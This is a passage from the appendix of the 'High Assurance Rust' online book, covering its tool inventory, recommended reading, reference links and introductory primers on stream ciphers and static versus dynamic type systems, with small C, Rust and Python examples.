<p><a href="https://github.com/google/capslock"><em>capslock</em></a>. Google (Accessed 2025). <a href="#fr-Capslock-1">↩</a></p>
</li>
<li id="footnote-CapslockCaps">
<p><a href="https://github.com/google/capslock/blob/main/docs/capabilities.md#capabilities"><em>Capabilities</em></a>. Google (Accessed 2025). <a href="#fr-CapslockCaps-1">↩</a></p>
</li>
<li id="footnote-RustPKI">
<p><a href="https://rustfoundation.org/media/improving-supply-chain-security-for-rust-through-artifact-signing/"><em>Improving Supply Chain Security for Rust Through Artifact Signing</em></a>. Adam Harvey (2023). <a href="#fr-RustPKI-1">↩</a></p>
</li>
<li id="footnote-RustTrustedPubs">
<p><a href="https://rust-lang.github.io/rfcs/3691-trusted-publishing-cratesio.html"><em>Security Improvements for CI Publishing to crates.io</em></a>. The Rust Project (Accessed 2025). <a href="#fr-RustTrustedPubs-1">↩</a></p>
</li>
<li id="footnote-PyTrustedPubs">
<p><a href="https://blog.pypi.org/posts/2023-04-20-introducing-trusted-publishers/"><em>Introducing 'Trusted Publishers'</em></a>. Dustin Ingram (2023). <a href="#fr-PyTrustedPubs-1">↩</a></p>
</li>
<li id="footnote-GoFIPS">
<p><a href="https://go.dev/doc/security/fips140"><em>FIPS 140-3 Compliance</em></a>. Go Project (Accessed 2025). <a href="#fr-GoFIPS-1">↩</a></p>
</li>
<li id="footnote-GoCSPRNG">
<p><a href="https://go.dev/blog/chacha8rand"><em>Secure Randomness in Go 1.22</em></a>. Russ Cox, Filippo Valsorda (2024). <a href="#fr-GoCSPRNG-1">↩</a></p>
</li>
<li id="footnote-LLM1">
<p><a href="https://arxiv.org/pdf/2211.03622"><em>Do users write more insecure code with AI assistants?</em></a>. Neil Perry, Megha Srivastava, Deepak Kumar, Dan Boneh (2023). <a href="#fr-LLM1-1">↩</a></p>
</li>
<li id="footnote-LLM2">
<p><a href="https://dl.acm.org/doi/pdf/10.1145/3610721"><em>Asleep at the Keyboard? Assessing the Security of GitHub Copilot's Code Contributions</em></a>. Hammond Pearce, Baleegh Ahmad, Benjamin Tan, Brendan Dolan-Gavitt, Ramesh Karri (2025). <a href="#fr-LLM2-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="appendix"><a class="header" href="#appendix">Appendix</a></h1>
<hr />
<p>The appendix's supplemental content is categorized as follows:</p>
<ul>
<li>
<p><strong>Setup</strong> sections detail development environment configuration and usage.</p>
</li>
<li>
<p><strong>Inventory</strong> sections catalog resources. Like tools covered and other books recommended.</p>
</li>
<li>
<p><strong>Foundations</strong> sections provide brief, optional introductions to key concepts. To accommodate readers of different backgrounds.</p>
</li>
<li>
<p><strong>Misc</strong> (miscellaneous) sections cover topics that, while important, don't fit naturally within the arc of the book.</p>
</li>
</ul>
<p>Appendix sections aren't just a tack-on - they're written with the same care and effort as the main chapters.</p>
<hr />
<div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="tools-of-the-trade"><a class="header" href="#tools-of-the-trade">Tools of the Trade</a></h1>
<p>This is a complete inventory of all the software assurance tools and Rust libraries you'll use in this book.
You'll get deep experience in a few, but only a taste of most.
Each name below is a link to the tool's homepage or documentation.</p>
<blockquote>
<p><strong>Rust's Open Formal Verification Ecosystem</strong></p>
<p>With a spectrum of open-source options, Rust's assurance ecosystem is thriving.
The Rust Formal Methods Interest Group (RFMIG) maintains a list of verification tools, <a href="https://rust-formal-methods.github.io/tools.html">available here</a>, more comprehensive than the sample we cover in this book.</p>
</blockquote>
<h3 id="core-tooling"><a class="header" href="#core-tooling">Core Tooling</a></h3>
<p><strong>Static Assurance</strong></p>
<p>Most tools in this category reason about source-level semantics to prove the absence of certain bugs.
They trust the compiler and, by extension, its backend.</p>
<ul>
<li><a href="https://rustc-dev-guide.rust-lang.org/"><code>rustc</code></a> (Rust-only, it's literally the compiler!)</li>
<li><a href="https://github.com/model-checking/kani"><code>cbmc</code> via <code>kani</code></a> (Rust front-end, underlying tool also supports C/C++)</li>
<li><a href="https://www.pm.inf.ethz.ch/research/prusti.html"><code>viper</code> via <code>prusti</code>*</a> (Underlying tool supports Rust, Python, Java, ...).</li>
<li><a href="https://github.com/xldenis/creusot"><code>creusot</code>*</a> (Rust-only)</li>
</ul>
<p><strong>Dynamic Assurance</strong></p>
<p>Most tools in this category test compiled executables to discover specific bugs or observe program behavior.
They remove the compiler from the chain of trust.</p>
<ul>
<li><a href="https://valgrind.org/"><code>valgrind</code>*</a> (x86, x86_64, ARM32, ARM64, MIPS, PPC)</li>
<li><a href="https://rr-project.org/"><code>rr</code></a> (x86, x86_64)</li>
<li><a href="https://llvm.org/docs/LibFuzzer.html"><code>libfuzzer</code> via <code>cargo-fuzz</code></a> (x86, x86_64, ARM64)</li>
<li><a href="https://www.qemu.org/"><code>qemu</code></a> (x86, x86_64, ARM32, ARM64, MIPS, PPC, AVR, ...)</li>
<li><a href="https://github.com/rust-lang/miri"><code>miri</code></a> (Rust-only)</li>
</ul>
<p><strong>Operational Assurance</strong></p>
<p>Tools that support a system's lifecycle.</p>
<ul>
<li><a href="https://docs.docker.com/engine/reference/commandline/cli/"><code>docker</code></a> (Linux guests)</li>
<li><a href="https://crates.io/crates/cbindgen"><code>cbindgen</code></a> (CFFI)</li>
</ul>
<h3 id="rust-ecosystem"><a class="header" href="#rust-ecosystem">Rust Ecosystem</a></h3>
<p>Open-source binaries and libraries hosted on <a href="https://crates.io/">crates.io</a>.</p>
<p><strong>Development</strong></p>
<ul>
<li><a href="https://crates.io/crates/clap"><code>clap</code></a> - Command line argument parsing.</li>
<li><a href="https://crates.io/crates/serde"><code>serde</code>*</a> - Rust structure serialization and deserialization.</li>
<li><a href="https://crates.io/crates/smallvec"><code>tinyvec</code></a> - <code>!#[no_std]</code>, <code>#![forbid(unsafe_code)]</code> <code>Vec</code> alternative.</li>
<li><a href="https://crates.io/crates/micromath"><code>micromath</code></a> - <code>!#[no_std]</code>, <code>#![forbid(unsafe_code)]</code> floating point approximations.</li>
<li><a href="https://crates.io/crates/lazy_static"><code>lazy_static</code>*</a> - runtime-initialized static variables.</li>
<li><a href="https://crates.io/crates/owo-colors"><code>owo-colors</code></a> - embedded-friendly text coloring.</li>
</ul>
<p><strong>Testing</strong></p>
<ul>
<li><a href="https://crates.io/crates/criterion"><code>criterion</code></a> - micro-benchmarking toolset.</li>
<li><a href="https://crates.io/crates/cargo-modules"><code>cargo-modules</code></a> - text render of project's module architecture.</li>
<li><a href="https://crates.io/crates/cargo-audit"><code>cargo-audit</code></a> - search project's decency graph for known-vulnerable versions.</li>
<li><a href="https://crates.io/crates/cargo-binutils"><code>cargo-binutils</code></a> - inspect the properties and contents of Linux binaries.</li>
<li><a href="https://crates.io/crates/cargo-bloat"><code>cargo-bloat</code></a> - determine what parts of an executable contribute to it's size.</li>
<li><a href="https://crates.io/crates/siderophile"><code>siderophile</code>*</a> - search project's call graph for pockets of <code>unsafe</code> code.</li>
<li><a href="https://crates.io/crates/cargo-tarpaulin"><code>cargo-tarpaulin</code>*</a> - code coverage reporting (MC/DC support planned).</li>
</ul>
<p><strong>Other</strong></p>
<ul>
<li><a href="https://crates.io/crates/xgadget"><code>xgadget</code>*</a> - ROP/JOP exploit development.</li>
</ul>
<hr />
<blockquote>
<p>* == may be subject to change. This book is a <a href="chp16_appendix/./faq.html#8-is-this-book-free">work in progress</a>.</p>
<p>Additional tools are likely to be added as the book matures. Though unlikely, tools may also be removed.</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="inventory-recommended-reading"><a class="header" href="#inventory-recommended-reading">Inventory: Recommended Reading</a></h1>
<p>This is a complete inventory of recommended reading, books that appear with the tag <em><strong>[PERSONAL FAVORITE]</strong></em> in footnotes.
We genuinely feel each book listed is either an essential read in its field or a reference worth keeping in arm's reach.</p>
<p>If you purchase a book using one of the affiliate links below, it helps support <em><strong>High Assurance Rust</strong></em> - in addition to the book you're buying!</p>
<h2 id="rust"><a class="header" href="#rust">Rust</a></h2>
<br>
<div style="width:100%;text-align:center;">
<a href="https://amzn.to/35cu1Za"> <img src="chp16_appendix/../img/recommended_books/book_rust_1.jpg" width="200"> </a>
</div>
<ul>
<li>
<p><em><strong>Programming Rust: Fast, Safe Systems Development</strong></em>. Jim Blandy, Jason Orendorff, Leonora Tindall (2021).</p>
<ul>
<li><a href="https://amzn.to/35cu1Za">https://amzn.to/35cu1Za</a></li>
</ul>
</li>
</ul>
<br>
<div style="width:100%;text-align:center;">
<a href="https://amzn.to/36GfSDU"> <img src="chp16_appendix/../img/recommended_books/book_rust_2.jpg" width="200"> </a>
</div>
<ul>
<li>
<p><em><strong>Rust for Rustaceans</strong></em>. Jon Gjengset (2021).</p>
<ul>
<li><a href="https://amzn.to/36GfSDU">https://amzn.to/36GfSDU</a></li>
</ul>
</li>
</ul>
<h2 id="software"><a class="header" href="#software">Software</a></h2>
<br>
<div style="width:100%;text-align:center;">
<a href="https://amzn.to/3IBnFA7"> <img src="chp16_appendix/../img/recommended_books/book_csapp.jpg" width="200"> </a>
</div>
<ul>
<li>
<p><em><strong>Computer Systems: A Programmer's Perspective</strong></em>. Randal Bryant, David O'Hallaron (2015).</p>
<ul>
<li><a href="https://amzn.to/3IBnFA7">https://amzn.to/3IBnFA7</a></li>
</ul>
</li>
</ul>
<br>
<div style="width:100%;text-align:center;">
<a href="https://amzn.to/3DbaPrp"> <img src="chp16_appendix/../img/recommended_books/book_phil.jpg" width="200"> </a>
</div>
<ul>
<li>
<p><em><strong>A Philosophy of Software Design</strong></em>. John Ousterhout (2021).</p>
<ul>
<li><a href="https://amzn.to/3DbaPrp">https://amzn.to/3DbaPrp</a></li>
</ul>
</li>
</ul>
<br>
<div style="width:100%;text-align:center;">
<a href="https://amzn.to/3wBuNu7"> <img src="chp16_appendix/../img/recommended_books/book_c.jpg" width="200"> </a>
</div>
<ul>
<li>
<p><em><strong>Effective C: An Introduction to Professional C Programming</strong></em>. Robert Seacord (2020).</p>
<ul>
<li><a href="https://amzn.to/3wBuNu7">https://amzn.to/3wBuNu7</a></li>
</ul>
</li>
</ul>
<h2 id="security"><a class="header" href="#security">Security</a></h2>
<br>
<div style="width:100%;text-align:center;">
<a href="https://amzn.to/3wvtCwa"> <img src="chp16_appendix/../img/recommended_books/book_pba.jpg" width="200"> </a>
</div>
<ul>
<li>
<p><em><strong>Practical Binary Analysis: Build Your Own Linux Tools for Binary Instrumentation, Analysis, and Disassembly</strong></em>. Dennis Andriesse (2018).</p>
<ul>
<li><a href="https://amzn.to/3wvtCwa">https://amzn.to/3wvtCwa</a></li>
</ul>
</li>
</ul>
<br>
<div style="width:100%;text-align:center;">
<a href="https://amzn.to/3IEYuNd"> <img src="chp16_appendix/../img/recommended_books/book_crypto.jpg" width="200"> </a>
</div>
<ul>
<li>
<p><em><strong>Understanding Cryptography</strong></em>. Christof Paar, Jan Pelzl (2009).</p>
<ul>
<li><a href="https://amzn.to/3IEYuNd">https://amzn.to/3IEYuNd</a></li>
</ul>
</li>
</ul>
<hr />
<div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="additional-resources"><a class="header" href="#additional-resources">Additional Resources</a></h1>
<p>This section collects reference resources for professional developers.
It's curated, not exhaustive.</p>
<h2 id="official"><a class="header" href="#official">Official</a></h2>
<ul>
<li>
<p><strong>The Rust Reference</strong></p>
<ul>
<li><a href="https://doc.rust-lang.org/reference/">https://doc.rust-lang.org/reference/</a></li>
</ul>
</li>
<li>
<p><strong>Rust API Guidelines</strong></p>
<ul>
<li><a href="https://rust-lang.github.io/api-guidelines/">https://rust-lang.github.io/api-guidelines/</a></li>
</ul>
</li>
<li>
<p><strong>Unsafe Code Guidelines Reference</strong></p>
<ul>
<li><a href="https://rust-lang.github.io/unsafe-code-guidelines/">https://rust-lang.github.io/unsafe-code-guidelines/</a></li>
</ul>
</li>
<li>
<p><strong>Guide to Rustc Development</strong></p>
<ul>
<li><a href="https://rustc-dev-guide.rust-lang.org/">https://rustc-dev-guide.rust-lang.org/</a></li>
</ul>
</li>
</ul>
<h2 id="unofficial"><a class="header" href="#unofficial">Unofficial</a></h2>
<ul>
<li>
<p><strong>Secure Rust Guidelines</strong> (ANSSI)</p>
<ul>
<li><a href="https://anssi-fr.github.io/rust-guide/">https://anssi-fr.github.io/rust-guide/</a></li>
</ul>
</li>
<li>
<p><strong>Rust Fuzz Book</strong> (<code>cargo-fuzz</code>)</p>
<ul>
<li><a href="https://rust-fuzz.github.io/book/">https://rust-fuzz.github.io/book/</a></li>
</ul>
</li>
<li>
<p><strong>The Kani Rust Verifier</strong> (<code>kani</code>)</p>
<ul>
<li><a href="https://model-checking.github.io/kani/">https://model-checking.github.io/kani/</a></li>
</ul>
</li>
</ul>
<hr />
<div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="fundamentals-stream-ciphers"><a class="header" href="#fundamentals-stream-ciphers">Fundamentals: Stream Ciphers</a></h1>
<p>Cryptography, the study of techniques to secure communication, is a field of mathematics predating Computer Science.
The majority of security engineers don't need to be experts in cryptography.
But every security engineer should have a healthy reverence for it.</p>
<p>Systems our society relies on, including any that support a financial transaction, all have some notion of "trust".
A communicating party can identify, with confidence, <em>who</em> they are "talking" to (authentication).
And they can rest assured that their "conversation" is <em>private</em> (confidentiality).</p>
<p>Cryptographic libraries are the technical mechanism underpinning properties like authentication and confidentiality.
The core means by which that trust is built and maintained.
Without them, most modern digital services wouldn't be practical.</p>
<p>As aspiring security engineers, there are basic concepts we should strive to understand before leveraging existing cryptographic APIs.
And definitely before implementing any cryptographic algorithms ourselves (which is generally not advisable).</p>
<h2 id="how-does-symmetric-encryption-work-big-picture"><a class="header" href="#how-does-symmetric-encryption-work-big-picture">How does symmetric encryption work, big picture?</a></h2>
<p>Two users, canonically Alice and Bob, want to communicate securely.
But there's a problem.
They need to exchange messages over an <strong>insecure channel</strong>, like the public internet or the physical space separating two Low Earth Orbit (LEO) satellites.
A malicious attacker, named Mallory, can view and potentially modify data sent across the insecure channel.</p>
<p>Encryption provides <strong>confidentiality</strong>, a mathematical guarantee that only Bob can read the <strong>plaintext</strong> contents of a message sent by Alice and vice versa.
Mallory is left out of the loop - any message she captures will appear indistinguishable from random garbage because it's encrypted.
The encrypted, unintelligible form of the message is called <strong>ciphertext</strong>.</p>
<p>Real-world communication protocols also ensure <strong>data integrity</strong> (proof that Mallory didn't modify Alice's message in transit) and provide <strong>data authentication</strong> (proof Bob is talking to the real Alice and not an imposter).
But we're only concerned with confidentiality for the purposes of this discussion.</p>
<p>So how can Alice and Bob use encryption to keep their communication confidential?
<strong>Symmetric</strong> (aka "secret key") cryptography is the straightforward option:
if Alice and Bob can agree on an encryption <strong>key</strong> using a <strong>secure channel</strong> beforehand, they can use the same symmetric encryption algorithm (like Chapter 2's RC4) to protect subsequent communication over the insecure channel.</p>
<p>The secure channel needs to be one Mallory can't access, because we can only achieve confidentiality if Mallory doesn't know the key (hence <em>secret</em> key).
Maybe Alice and Bob meet face-to-face once, months before they plan to communicate, to agree on a key.
Setting up secure channels is often cumbersome.
Sometimes it's entirely impractical.</p>
<p><strong>Asymmetric</strong> (aka "public key") cryptography addresses this problem.
But that's a topic outside the scope of our discussion.</p>
<blockquote>
<p><strong>Kerckoffs' Principle</strong></p>
<p>Mallory can't know the secret key.
But, perhaps surprisingly, it's actually <em>preferable</em> that Mallory <em>does know</em> the exact encryption algorithm used by Alice and Bob!</p>
<p>Kerchoff's Principle<sup class="footnote-reference" id="fr-Kerchoff-1"><a href="#footnote-Kerchoff">1</a></sup> states that a cryptosystem should be secure even if the attacker knows everything about it except for the key.
The security guarantee in Alice and Bob's communication should be derived from the mathematical properties of a well-known, well-vetted encryption algorithm - not from the hiding of a specific detail (that's "security by obscurity", a strategy that often fails in practice).</p>
</blockquote>
<h2 id="ok-so-what-is-a-stream-cipher"><a class="header" href="#ok-so-what-is-a-stream-cipher">Ok. So what is a stream cipher?</a></h2>
<p>A class of symmetric algorithm that can be used to actually perform the encryption, after Alice and Bob have agreed on a secret key.</p>
<p><strong>Stream ciphers</strong> could, in theory, encrypt a single bit at a time.
They "think" of data as a continuous bitstream.
In practice, most implementations encrypt a byte (8 bits) at a time because modern computers use byte addressable memory.</p>
<p>By contrast, <strong>block ciphers</strong> need to break data up into fixed-size chunks.
For the popular Advanced Encryption Standard (AES)<sup class="footnote-reference" id="fr-AES-1"><a href="#footnote-AES">2</a></sup>, a block must be 128 bits (16 bytes).</p>
<p>While both stream and block ciphers accomplish the same goal, stream ciphers tend have a smaller memory footprint and faster runtimes<sup class="footnote-reference" id="fr-Perf-1"><a href="#footnote-Perf">3</a></sup>.
So they're often used for low-resource embedded systems and real-time data processing.</p>
<p>The "smarts" of any stream cipher algorithm is how it turns a finite-size key (RC4 lets Alice and Bob choose anywhere from 40 to 2,048 bits) into a <strong>keystream</strong> as long as the input data (which could be arbitrarily long, maybe we need to encrypt a 10 GB file).</p>
<p>The challenge of stream cipher algorithm design is creating <em>unpredictable</em> key streams.
Even though encryption and decryption are deterministic operations, the key stream must <em>appear truly random</em> (as if produced by measuring irreplicable physical phenomena) in order to effectively hide messages from Mallory.
Cryptographers call key stream generating functions <em>Cryptographically Secure Pseudorandom Number Generators (CSPRNGs)</em>.</p>
<p>If we can generate an unpredictable keystream, encryption is simple: XOR every bit/byte in the key stream with the corresponding bit/byte in the plaintext to produce ciphertext.</p>
<p>Chapter 2's RC4 implementation should give you a feel for how this all works in practice!</p>
</br>
<p align="center">
  <img width="100%" src="chp16_appendix/stream_cipher.svg">
  <figure>
  <figcaption><center>Two-party communication over an insecure channel. Based on "Understanding Cryptography" by Paar et al, page 38.</center></figcaption><br>
  </figure>
</p>
<h2 id="where-can-i-learn-more-about-cryptography"><a class="header" href="#where-can-i-learn-more-about-cryptography">Where can I learn more about cryptography?</a></h2>
<p>We recommend <em>Understanding Cryptography</em> by Paar and Pelzl<sup class="footnote-reference" id="fr-UnderstandingCrypto-1"><a href="#footnote-UnderstandingCrypto">4</a></sup> and its corresponding video lectures<sup class="footnote-reference" id="fr-UnderstandingCryptoVideo-1"><a href="#footnote-UnderstandingCryptoVideo">5</a></sup>.</p>
<p>Many cryptography books assume a PhD-level math background, making them almost unreadable for the average practicing engineer.
Others dumb it down too much, replacing all math with cartoonish diagrams (a sin this section is guilty of).
<em>Understanding Cryptography</em> is a happy medium: accessible with undergraduate-level math experience but still the real deal.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-Kerchoff">
<p><a href="https://en.wikipedia.org/wiki/Kerckhoffs%27s_principle"><em>Kerchoff's Principle</em></a>. Wikipedia (Accessed 2022). <a href="#fr-Kerchoff-1">↩</a></p>
</li>
<li id="footnote-AES">
<p><a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard"><em>Advanced Encryption Standard</em></a>. Wikipedia (Accessed 2022). <a href="#fr-AES-1">↩</a></p>
</li>
<li id="footnote-Perf">
<p>This is a generalization, performance characteristics vary greatly by algorithm and implementation. And sometimes a specific algorithm is implemented in hardware, making it much faster than a comparable software implementation. For example, modern x86 processors offer instruction set extensions specifically for AES - the speed up can be up to 13x<sup class="footnote-reference" id="fr-AESNI-1"><a href="#footnote-AESNI">6</a></sup>. <a href="#fr-Perf-1">↩</a></p>
</li>
<li id="footnote-UnderstandingCrypto">
<p><a href="https://amzn.to/3IEYuNd"><em><strong>[PERSONAL FAVORITE]</strong> Understanding Cryptography</em></a>. Christof Paar, Jan Pelzl (2009). <a href="#fr-UnderstandingCrypto-1">↩</a></p>
</li>
<li id="footnote-UnderstandingCryptoVideo">
<p><a href="https://www.crypto-textbook.com/movies.php"><em>Online Cryptography Course</em></a>. Christof Paar, Jan Pelzl (2009). <a href="#fr-UnderstandingCryptoVideo-1">↩</a></p>
</li>
<li id="footnote-AESNI">
<p><a href="http://www.sce.carleton.ca/faculty/huang/iccae-2020.pdf"><em>Advanced Encryption Standard New Instructions (AES-NI) Analysis: Security, Performance, and Power Consumption</em></a>. Eslam AbdAllah, Yu Rang Kuang, and Changcheng Huang (2020). <a href="#fr-AESNI-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="fundamentals-type-systems"><a class="header" href="#fundamentals-type-systems">Fundamentals: Type Systems</a></h1>
<blockquote>
<p><strong>Note:</strong> This section is a work-in-progress. It may be expanded or revised to cover more formal aspects, like type rules, in the future.</p>
</blockquote>
<p>Rust's secret sauce is its type system.
So we should discuss types.
This is a dense topic whose dedicated field, type theory, predates computer programming.
We won't do it justice in a handful of pages.</p>
<p>Static type systems are perhaps the most widespread and powerful form of static analysis in existence.
Let's think of types as having two jobs:</p>
<h2 id="1-mapping-abstract-data-to-a-physical-machine"><a class="header" href="#1-mapping-abstract-data-to-a-physical-machine">1. Mapping abstract data to a physical machine</a></h2>
<p>Types are specifications for how data is read and written.
At the mechanical level of hardware.
In memory, every construct is just a bit pattern - a sequence of <code>0</code>s and <code>1</code>s.
Types provide language-level overlays suited to human reasoning.</p>
<p>For example: integer types interpret sequences of bits, 64 at time on modern "64-bit" machines, as whole numbers.
They can be operated on mathematically (addition, subtraction, multiplication, etc) when stored in "registers" (think tiny, readily-accessible, CPU-specific chunks).</p>
<p>Let's revisit the <code>incr</code> function from Chapter 2.
We had a function taking pointers to integers as arguments.
In C, the below code couldn't guarantee that pointers <code>a</code> and <code>b</code> don't alias.
Or that either pointer refers to a valid memory location.</p>
<pre><code class="language-c">void incr(int* a, int* b) {
    *a += *b;
}
</code></pre>
<p>The Rust port eliminated both of those problems:</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>fn incr(a: &amp;mut isize, b: &amp;isize) {
    *a += *b;
}
<span class="boring">}</span></code></pre></pre>
<p>Both languages have type systems that do semantic superimposition.
They map source code operations to physical hardware operations:</p>
<ol>
<li>
<p>Read bit-patterns from RAM address (values of integers types <code>a</code> and <code>b</code>) into registers (dereference reads).</p>
</li>
<li>
<p>Add the values of the two CPU registers, as if whole numbers, using a CPU instruction (mathematical operation).</p>
</li>
<li>
<p>Writes the result back to memory (dereference write).</p>
</li>
</ol>
<h2 id="2-verifying-program-behavior-by-elimination"><a class="header" href="#2-verifying-program-behavior-by-elimination">2. Verifying program behavior by elimination</a></h2>
<p>Types have another job in addition to, or perhaps in unison with, working out how the hardware sausage is made.
They verify what programs will do, by elimination.
A seminal textbook on the subject<sup class="footnote-reference" id="fr-TPL-1"><a href="#footnote-TPL">1</a></sup> suggests:</p>
<blockquote>
<p>A type system is a tractable syntactic method for proving the absence of certain program behaviors by classifying phrases according to the kinds of values they compute.</p>
</blockquote>
<p>That essentially means types can constrain possible behaviors, so you can be confident certain things won't happen.
In the case of the Rust <code>incr</code> function, that means eliminating two problem states (aliasing and invalid pointers) completely.</p>
<p>How do we prove absence of certain behaviors?
At a high level: by <em>grouping</em> values based on desired behavior.
For example:</p>
<ul>
<li>
<p><strong>Grouping:</strong> Values <code>0</code>, <code>1</code>, <code>2</code>, ..., <code>255</code> can be grouped into the type <code>u8</code> (8-bit unsigned integer).</p>
</li>
<li>
<p><strong>Proving absence of a behavior:</strong> The <code>+</code> operator applied to <code>u8</code> operands performs <em>addition</em>, not <em>concatenation</em>. Thus we guarantee the program will never concatenate two unsigned bytes - that operation has no meaning in the language.</p>
</li>
</ul>
<p>The difference between two broad classes of type systems, static and dynamic, comes down to <em>how</em> we do that proving of absence:</p>
<ul>
<li>
<p><strong>Static typing</strong> does the proving at compile-time. Guaranteeing the program will never exhibit a behavior at runtime.</p>
<ul>
<li>Variables have types. As a consequence, so do values. And types are known at compile-time, for every possible execution.</li>
</ul>
</li>
<li>
<p><strong>Dynamic typing</strong> tags values with types at runtime. The legality of operations is checked during program execution. If the check fails, the program may terminate or throw an exception.</p>
<ul>
<li>Values have types, variables do not. And the type of a value is only known at runtime.</li>
</ul>
</li>
</ul>
<h2 id="case-study-dynamic-typing"><a class="header" href="#case-study-dynamic-typing">Case Study: Dynamic Typing</a></h2>
<p>Sometimes the best way to internalize an idea is to look at a counter example.
Contrast can be illuminating.
Let's step away from Rust's static types for a minute.</p>
<p>Python is a scripting language with a beginner-friendly syntax and a large professional user base.
Unlike Rust, it's dynamically typed.
For many projects, this reduces development friction and improves prototyping speed.
The interpreter's abstractions allow developers to focus on the product they ship - not the machine they run it on.</p>
<p>But there's a world of use cases, from low-power embedded sensing to high-performance distributed workloads, for which Python is wholly unsuitable.
High assurance applications are one subset.
The relatively sluggish performance is a factor, but poor reliability is the bigger downside.
Let's see why.</p>
<p>Start by firing up the Python Read Execute Print Loop (REPL) with the command:</p>
<pre><code class="language-ignore">python3
</code></pre>
<p>The REPL allows us to execute programs as we enter them, a convenient workflow enabled by dynamic typing.
Declare two variables, <code>word</code> and <code>x</code>, and inspect their types:</p>
<pre><code class="language-python">&gt;&gt;&gt; word = "Hello"
&gt;&gt;&gt; print(type(word))
&lt;class 'str'&gt;
&gt;&gt;&gt; x = 3
&gt;&gt;&gt; print(type(x))
&lt;class 'int'&gt;
</code></pre>
<p>Multiplying <code>word</code> (a string) by <code>x</code> (an integer) is legal.
Here's the result:</p>
<pre><code class="language-python">&gt;&gt;&gt; print(word*x)
HelloHelloHello
</code></pre>
<p>But consider multiplying a string by a string (<code>word</code> by itself).
That doesn't generally make sense, so it will result in an error.
Rust will catch this error at compile time, long before we ship our code.
But Python throws it at <em>runtime</em>, and only if that particular line gets executed:</p>
<pre><code class="language-python">&gt;&gt;&gt; print(word*word)
Traceback (most recent call last):
  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
TypeError: can't multiply sequence by non-int of type 'str'
</code></pre>
<p>For high assurance software, that's too late.
A single type error, hit on a code path not covered in our test suite, means service degradation or outage.
Without a static type system, executing uncommon or untested paths through a program is akin to "flying by the seat of your pants".
And if we refactor dynamically typed code against an incomplete test suite, we might actually be adding those rare paths.</p>
<blockquote>
<p><strong>Can't we just get 100% test coverage?</strong></p>
<p>Achieving 100% coverage can be impractical for large projects.
Even if we could, the state-space of a program (set of all possible states) isn't necessarily correlated with its coverage (set of statements executed).
That means we could pass tests with full coverage and still hit a type error at runtime, in production.</p>
</blockquote>
<h2 id="goldilocks-assurance-contrast"><a class="header" href="#goldilocks-assurance-contrast">Goldilocks Assurance Contrast</a></h2>
<p>In the 1970s, compilers for industrial applications were largely uncharted waters.
